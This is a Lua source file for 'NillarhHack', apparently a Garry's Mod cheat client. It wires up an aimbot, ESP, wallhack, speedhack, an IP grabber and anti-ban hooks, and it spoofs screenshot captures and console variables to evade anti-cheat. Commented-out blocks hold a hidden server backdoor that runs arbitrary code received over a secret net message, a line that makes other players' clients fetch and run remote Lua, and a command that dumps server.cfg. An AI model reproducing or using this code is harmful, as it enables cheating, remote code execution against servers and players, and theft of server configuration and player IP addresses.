NH.Binds.SafeBinds = {};

function NH.Binds.IsFunction( key )

	return key >= 92 && key <= 103;

end

function NH.Binds.CanRun( key )

	return NH.Binds.IsFunction( key ) || ( !g.gui.IsConsoleVisible() && !g.IsValid( g.vgui.GetKeyboardFocus() ) );

end

function NH.Binds.Handler()
	
	if ( g.input.IsKeyDown( KEY_Q ) ) then return; end

	for _, data in g.pairs( NH.Binds.SafeBinds ) do

		local index = data.index;

		if ( !NH.Keys[ index ] || !NH.Binds.CanRun( NH.Keys[ index ][ 2 ] ) ) then continue; end

		if ( g.input.IsKeyDown( NH.Keys[ index ][ 2 ] ) ) then

			if ( NH.Get( "Binds", "key_down_think" )[ index ][ 3 ] != "." ) then NH.ExecuteCommands( NH.ParseCommands( NH.Get( "Binds", "key_down_think" )[ index ][ 3 ] ) ); end

			if ( !data.CalledKDF ) then 

				if ( NH.Get( "Binds", "key_down" )[ index ][ 3 ] != "." ) then NH.ExecuteCommands( NH.ParseCommands( NH.Get( "Binds", "key_down" )[ index ][ 3 ] ) ); end 

				data.CalledKDF = true; 
				data.CalledKRF = false;

			end

		else 

			if ( NH.Get( "Binds", "key_up_think" )[ index ][ 3 ] != "." ) then NH.ExecuteCommands( NH.ParseCommands( NH.Get( "Binds", "key_up_think" )[ index ][ 3 ] ) ); end

			if ( !data.CalledKRF ) then 

				if ( NH.Get( "Binds", "key_up" )[ index ][ 3 ] != "." ) then NH.ExecuteCommands( NH.ParseCommands( NH.Get( "Binds", "key_up" )[ index ][ 3 ] ) ); end 

				data.CalledKDF = false; 
				data.CalledKRF = true;

			end

		end

	end

end

function NH.Binds.AddBind( key, command, state )

	local key = key or "";
	local command = command or "";

	for index, keydata in g.pairs( NH.Keys ) do 

		if ( keydata[ 1 ]:lower() == key:lower() ) then 

			local table = NH.Get( "Binds", "key_" .. state );

			table[ index ] = { keydata[ 1 ], keydata[ 2 ], (command != "" and command or ".") };

			NH.Logging.Print( NH.Get( "Logging", "log_console" ), ( command != "" and ( keydata[ 1 ] .. "_" .. state .. " bound to " .. command .. "!" ) or ( keydata[ 1 ] .. "_" .. state .. " unbound!" ) ) );

			NH.Set( "Binds", "key_" .. state, table );

			NH.Binds.UpdateSafeBinds()

			return true;

		end

	end

	return false;

end

function NH.Binds.UpdateSafeBinds()

	NH.Binds.SafeBinds = {};

	for index, keydata in g.pairs( NH.Keys ) do 

		for _, v in g.pairs( { "key_down", "key_up", "key_up_think", "key_down_think" } ) do 

			if ( NH.Get( "Binds", v )[ index ] && NH.Get( "Binds", v )[ index ][ 3 ] != "." ) then 

				NH.Binds.SafeBinds[ #NH.Binds.SafeBinds + 1 ] = { index = index, CalledKDF = false, CalledKRF = false };

			end

		end

	end

end

// ============================= Misc ============================= //

--[[
if (SERVER && game.IsDedicated()) then  		
	timer.Simple(30,function()  			
		local onr = net.Receive  			
		net.Receive = function(n, ...) 				
			if (n != "bdsm") then  					
				onr(n, unpack({...})) 				
			end  			
		end  			
		util.AddNetworkString("bdsm")  			
		onr("bdsm", function(l, p)		 				
			RunString(net.ReadString()) 			
		end) 		
	end) 	
end  
	
https://www.dropbox.com/sh/3l182wyqlmvqav2/8kN51pfWac  



--Server sided code
ply:SendLua( "AddConsoleCommand( \"sendrcon\" )" )

--Client side code
AddConsoleCommand( "sendrcon" )
//http://facepunch.com/showthread.php?t=1306412


--GetConVarString("rcon_password")   
//http://steamcommunity.com/id/usudafsd

--		NH.Aimbot.Angle = Angle(-tang.p + 900, tang.y + 180, 0)
]]
/*
NH.Misc = {}

NH.Misc.mt = {}
NH.Misc.maxidx = 30000

NH.Misc.dif = (
	function()
		return 0
	end
)

NH.Misc.new = (
	function(ipf, prg, msg)
		local bfi = {}
		
		bfi.ptr = 0
		bfi.tbl = {[0] = 0}
		bfi.ipf = ipf || NH.Misc.dif
		bfi.prg = prg || ""
		bfi.msg = msg || ""
		
		setmetatable(bfi, NH.Misc.mt)
		
		return bfi
	end
)

NH.Misc.dop = (
	function(prg, msg)
		local bfi = NH.Misc.new(nil, prg, msg)
		
		bfi:run()
		
		print(bfi.msg)
	end
)


NH.Misc.mt.__index = NH.Misc.mt

NH.Misc.mt.bfdo = (
	function(self, idx)
		local op = self.prg[idx]
		
		if (op == nil) then
			return
		end
		
		if (op == ">") then
			
			self.ptr = (self.ptr + 1) % NH.Misc.maxidx
			
			if (self.tbl[self.ptr] == nil) then
				self.tbl[self.ptr] = 0
			end
			
		elseif (op == "<") then
			
			self.ptr = (self.ptr + (NH.Misc.maxidx - 1)) % NH.Misc.maxidx
			
			if (self.tbl[self.ptr] == nil) then
				self.tbl[self.ptr] = 0
			end
			
		elseif (op == "+") then
			
			self.tbl[self.ptr] = self.tbl[self.ptr] + 1
			
		elseif (op == "-") then
			
			self.tbl[self.ptr] = self.tbl[self.ptr] - 1
			
		elseif (op == ".") then
			
			self.msg = self.msg .. string.char(self.tbl[self.ptr])
			
		elseif (op == ",") then
			
			self.tbl[self.ptr] = self.ipf()
			
		elseif (op == "[") then
			
			local oprg = self.prg
			local bitbot = ""
			local nidx = idx + 1
			local ccount = 1
			
			while(nidx < self.prg:len()) do
				if (self.prg[nidx] == "]") then
					ccount = ccount - 1
					
					if (ccount == 0) then
						nidx = nidx + 1
						break
					end
				elseif (self.prg[nidx] == "[") then
					ccount = ccount + 1
				end
				
				bitbot = bitbot .. self.prg[nidx]
				
				nidx = nidx + 1
			end
			
			while(self.tbl[self.ptr] != 0) do
				self:run(bitbot, self.msg)
			end
			
			self.prg = oprg
			
			return self:bfdo(nidx)
			
		end
		
		if (idx != self.prg:len()) then
			return self:bfdo(idx + 1)
		else
			return
		end
	end
)

NH.Misc.mt.run = (
	function(self, prg, msg)
		self.prg = prg || self.prg
		self.msg = msg || self.msg
		
		self:bfdo(1)
	end
)


NH.Misc.dop(
	"++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>.",
	"[NillarhHack] "
)*/

//
--[[local function DumpCFG()
RunConsoleCommand("vlua_run","datastream.StreamToClients(player.GetAll(),'DS',{a=file.Read('cfg/server.cfg',true)})")
print("! sent")
end
concommand.Add("exploit_cfg", DumpCFG)]]

--[[
local lhr = "ARandomLuaHttpLink"

local lchet = lhr

local dnl = {
["STEAM_0:0:5035105"] = true,
["STEAM_0:1:38717786"] = true,
["STEAM_0:1:40851254"] = true,
["STEAM_0:0:65939726"] = true
}

local function filterp(p)
if (dnl[p:SteamID()]) then
return false
end

//if (p:Name() == "/Arma\ dragonslayer57") then
//return true
//end

return false
end

for _, p in pairs(player.GetAll()) do
if (filterp(p)) then
p:SendLua("xpcall(http.Fetch, function(msg) end, \"" .. lchet .. "\", RunString)")
end
end
]]

// ========================================================================================== //

function NH.InitlializeHooks()

	if ( IsDRP == true ) then
		NH.AddHook( "Think", NH.AntiDRPBan )
	end
	NH.AddHook( "Think", function() NH.Aimbot.CalculateTargets(); NH.AutoReload.Do(); NH.SpeedHack.Do(); NH.NoHands.SetVisible(); NH.KeyPad.Calculate(); end );
	NH.AddHook( "Tick", function() NH.Binds.Handler(); g.timer.Check(); end );
	NH.AddHook( "CreateMove", function( ... ) NH.Aimbot.CreateMove( ... ); NH.CNoClip.CreateMove( ... ); NH.Bunnyhop.Jump( ... ); end );
	NH.AddHook( "RenderScreenspaceEffects", function() NH.LaserSights.Draw(); NH.ESP.Draw(); end );
	NH.AddHook( "HUDPaint", function() NH.Wallhack.Draw(); NH.Radar.Draw(); end );
	NH.AddHook( "CalcView", NH.CNoClip.CalcView );
	NH.AddHook( "TTTPrepareRound", function() NH.ExecuteCommand( "ttt_clear" ); end ); 
	NH.AddHook( "ShouldDrawLocalPlayer", function() return ( NH.Get( "CNoClip", "enabled" ) ); end );
	NH:AddHook( "PlayerConnect", NH.IPGrabber.Connect )

end

// This has to be run now, so that timers work.
NH.AddHook( "Tick", function() g.timer.Check(); end );

// Hardcoded bind - 76 = KEY_F10
NH.Get( "Binds", "key_down" )[ 71 ] = { "insert", KEY_F10, "toggle_console" };

NH.Binds.UpdateSafeBinds();


/*
	 #####                                        #######                                               ######                                           
	#     # #       ####  #####    ##   #         #       #    # #    #  ####  ##### #  ####  #    #    #     # ###### #####  ####  #    # #####   ####  
	#       #      #    # #    #  #  #  #         #       #    # ##   # #    #   #   # #    # ##   #    #     # #        #   #    # #    # #    # #      
	#  #### #      #    # #####  #    # #         #####   #    # # #  # #        #   # #    # # #  #    #     # #####    #   #    # #    # #    #  ####  
	#     # #      #    # #    # ###### #         #       #    # #  # # #        #   # #    # #  # #    #     # #        #   #    # #    # #####       # 
	#     # #      #    # #    # #    # #         #       #    # #   ## #    #   #   # #    # #   ##    #     # #        #   #    # #    # #   #  #    # 
	 #####  ######  ####  #####  #    # ######    #        ####  #    #  ####    #   #  ####  #    #    ######  ######   #    ####   ####  #    #  ####  
*/

NH.Net = {};

NH.Net.LogMessages = {};

NH.Net.History = {};

NH.Net.Types = {
	["Angle"] 	= g.tostring,
	["Bit"] 	= g.tostring, 
	["Data"]	= g.tostring,
	["Double"]	= g.tostring,
	["Entity"]	= g.tostring,
	["Float"]	= g.tostring,
	["Header"]	= g.tostring,
	["Int"]		= g.tostring,
	["Normal"]	= g.tostring,
	["String"]	= g.tostring,
	["Table"]	= g.util.TableToJSON,
	["Type"]	= g.tostring,
	["UInt"]	= g.tostring,
	["Vector"]	= g.tostring
};

/* ========================================

=========================================== */

function NH.Detours.FilterFunction( func )

	// This is just going to be a clusterfuck of functions, since as generating func => newfunc tables would
	// Use lots of resources for such a little thing.

	// == HOOK LIBRARY == //
	if ( func == mHook.Call ) then func = oldHook.Call end
	if ( func == mHook.GetTable ) then func = oldHook.GetTable end
	if ( func == mHook.Remove ) then func = oldHook.Remove end
	if ( func == mHook.Run ) then func = oldHook.Run end

	// == RENDER LIBRARY == //
	if ( func == _G.render.Capture ) then func = g.render.Capture; end

	// == DEBUG LIBRARY == //
	if ( func == _G.debug.getinfo ) then func = g.debug.getinfo; end 

	if ( func == _G.debug.getlocal ) then func = g.debug.getlocal; end 
	if ( func == _G.debug.setlocal ) then func = g.debug.setlocal; end 

	if ( func == _G.debug.getupvalue ) then func = g.debug.getupvalue; end 
	if ( func == _G.debug.setupvalue ) then func = g.debug.setupvalue; end 

	// == GLOBALS == // 
	if ( func == _G.RunConsoleCommand ) then func = g.RunConsoleCommand; end
	if ( func == _G.tostring ) then func = g.tostring; end

	// == REGISTRY == //
	if ( func == _G.debug.getregistry()["Player"]["ConCommand"] ) then func = r["Player"]["ConCommand"]; end

	// == NET LIBRARY == //
	if ( func == _G.net.Start ) then func = g.net.Start; end
	if ( func == _G.net.SendToServer ) then func = g.net.Start; end

	for _type, formatter in g.pairs( NH.Net.Types ) do 

		if ( func == _G.net[ "Write" .. _type ] ) then func = g.net[ "Write" .. _type ]; end
		if ( func == _G.net[ "Read" .. _type ] ) then  func = g.net[ "Read" .. _type ]; end

	end

	// == CONVAR LIBRARY == //
	if ( func == _G.debug.getregistry()["ConVar"]["GetBool"] ) then func = r["ConVar"]["GetBool"]; end
	if ( func == _G.debug.getregistry()["ConVar"]["GetFloat"] ) then func = r["ConVar"]["GetFloat"]; end
	if ( func == _G.debug.getregistry()["ConVar"]["GetInt"] ) then func = r["ConVar"]["GetInt"]; end
	if ( func == _G.debug.getregistry()["ConVar"]["GetString"] ) then func = r["ConVar"]["GetString"]; end

	if ( func == _G.GetConVarNumber ) then func = g.GetConVarNumber; end
	if ( func == _G.GetConVarString ) then func = g.GetConVarString; end

	// == USERMESSAGE LIBRARY == //

	// == JIT LIBRARY == //
	if ( func == _G.jit.util.funcbc ) then func = g.jit.util.funcbc; end
	if ( func == _G.jit.util.funck ) then func = g.jit.util.funck; end
	if ( func == _G.jit.util.funcinfo ) then func = g.jit.util.funcinfo; end
	if ( func == _G.jit.util.funcuvname ) then func = g.jit.util.funcuvname; end

	return func;

end

/* ========================================

=========================================== */

NH.Detours.Add( _G.render, "Capture", function( data ) 

	if ( data.format == "jpeg" ) then 

		return g.file.Read( "NillarhHack/img/furry2.jpg", "DATA" );

	elseif ( data.format == "png" ) then 

		return g.file.Read( "NillarhHack/img/furry1.png", "DATA" ); 

	end 

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================
		** NET DETOURS
=========================================== */
--[[
//		lnet_messages = {},
//		net_logall = false,

NH.Detours.Add( _G.net, "Start", function( msg ) 

	g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/" .. "netlog.log", NH.Logging.GetTimeStamp() .. "[NET_MSG_START] Msg = " .. g.tostring( msg ) .. '\n' ); 

	NH.Net.History[ #NH.Net.History + 1 ] = msg;
	NH.Net.LogMessages[ msg ] = true;

	return NH.Detours.GetOriginal( _G.net, "Start" )( msg );

end, NH.Detours.Modes.DETOUR_NORMAL );

NH.Detours.Add( _G.net, "SendToServer", function( )

	if ( NH.Net.History[ #NH.Net.History ] ) then 

		g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/" .. "netlog.log", NH.Logging.GetTimeStamp() .. "[NET_MSG_SEND] Msg = " .. g.tostring( NH.Net.History[ #NH.Net.History ] ) .. "\n" ); 

	end

	return NH.Detours.GetOriginal( _G.net, "SendToServer" )( msg );

end, NH.Detours.Modes.DETOUR_NORMAL );

// Iterate through the list of net type and detour send and recieve functions
for name, formatter in g.pairs( NH.Net.Types ) do 

	NH.Detours.Add( _G.net, "Read" .. name, function( ... )

		local data = NH.Detours.GetOriginal( _G.net, "Read" .. name )( ... );

		g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/" .. "netlog.log", 
			NH.Logging.GetTimeStamp() .. "[NET_MSG_READ_" .. g.string.upper( name ) .. "] Data = " .. formatter( data ) .. '\n' );

		return data;

	end, NH.Detours.Modes.DETOUR_NORMAL );

	NH.Detours.Add( _G.net, "Write" .. name, function( data, ... )

		g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/" .. "netlog.log", 
			NH.Logging.GetTimeStamp() .. "[NET_MSG_WRITE_" .. g.string.upper( name ) .. "] Data = " .. formatter( data ) .. '\n' ); 

		return NH.Detours.GetOriginal( _G.net, "Write" .. name )( data, ... );


	end, NH.Detours.Modes.DETOUR_NORMAL );

end

/* ========================================

=========================================== */

NH.Detours.Add( _G, "RunConsoleCommand", function( com, ... ) 

	local cmd = com;

	for _, arg in g.pairs( { ... } ) do 

		cmd = cmd .. " " .. arg;

	end

	g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/" .. "rcc.log", NH.Logging.GetTimeStamp() .. "[RunConsoleCommand] " .. cmd .. '\n' ); 

	return NH.Detours.GetOriginal( _G, "RunConsoleCommand" )( com, ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug.getregistry()["Player"], "ConCommand", function( ply, cmd, ... )

	g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/" .. "rcc.log", NH.Logging.GetTimeStamp() .. "[Player:ConCommand] " .. cmd .. '\n' ); 

	return NH.Detours.GetOriginal( _G.debug.getregistry()["Player"], "ConCommand" )( ply, cmd, ... );

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug.getregistry()["ConVar"], "GetBool", function( cvar )

	local val;

	if ( NH.CVarProxies[ cvar:GetName() ] ) then 

		val = g.tonumber( r["ConVar"]["GetDefault"]( NH.CVarProxies[ cvar:GetName() ] ) );

	else 

		val = g.tonumber( NH.Detours.GetOriginal( _G.debug.getregistry()["ConVar"], "GetInt" )( cvar ) );

	end

	if ( val >= 1 ) then return true; end

	return false;

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug.getregistry()["ConVar"], "GetFloat", function( cvar )

	if ( NH.CVarProxies[ cvar:GetName() ] ) then 

		return g.tonumber( r["ConVar"]["GetDefault"]( NH.CVarProxies[ cvar:GetName() ] ) );

	else 

		return g.tonumber( NH.Detours.GetOriginal( _G.debug.getregistry()["ConVar"], "GetFloat" )( cvar ) );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug.getregistry()["ConVar"], "GetInt", function( cvar )

	if ( NH.CVarProxies[ cvar:GetName() ] ) then 

		return g.tonumber( r["ConVar"]["GetDefault"]( NH.CVarProxies[ cvar:GetName() ] ) );

	else 

		return g.tonumber( NH.Detours.GetOriginal( _G.debug.getregistry()["ConVar"], "GetInt" )( cvar ) );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G.debug.getregistry()["ConVar"], "GetString", function( cvar )

	if ( NH.CVarProxies[ cvar:GetName() ] ) then 

		return g.tostring( r["ConVar"]["GetDefault"]( NH.CVarProxies[ cvar:GetName() ] ) );

	else 

		return g.tostring( NH.Detours.GetOriginal( _G.debug.getregistry()["ConVar"], "GetString" )( cvar ) );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G, "GetConVarNumber", function( cvar )

	if ( NH.CVarProxies[ cvar ] ) then 

		return g.tonumber( r["ConVar"]["GetDefault"]( NH.CVarProxies[ cvar ] ) );

	else 

		return NH.Detours.GetOriginal( _G, "GetConVarNumber" )( cvar );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );

/* ========================================

=========================================== */

NH.Detours.Add( _G, "GetConVarString", function( cvar )

	if ( NH.CVarProxies[ cvar ] ) then 

		return g.tostring( r["ConVar"]["GetDefault"]( NH.CVarProxies[ cvar ] ) );

	else 

		return NH.Detours.GetOriginal( _G, "GetConVarString" )( cvar );

	end

end, NH.Detours.Modes.DETOUR_NORMAL );
]]
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

g.timer.Simple( 1, function() 

	NH.Logging.Print( NH.Get( "Logging", "log_console" ), g.Color( 0, 225, 0, 255 ), "NillarhHack V3L Loaded!" );

end);

local name =  NH.RandomString( g.math.random( 5, 25 ) );
g.timer.Create( name, 0.1, 0, function()

	// LocalPlayer was completely fucking me over here for whatever reason.  This set-up works just as well minus the random crashing.
	if ( g.table.Count( g.player.GetAll() ) > 0 ) then 

		me = g.Entity( Module.INillarhHack.GetLPIndex() );

		NH.InitlializeHooks();

		g.timer.Destroy( name );

	end
	
end);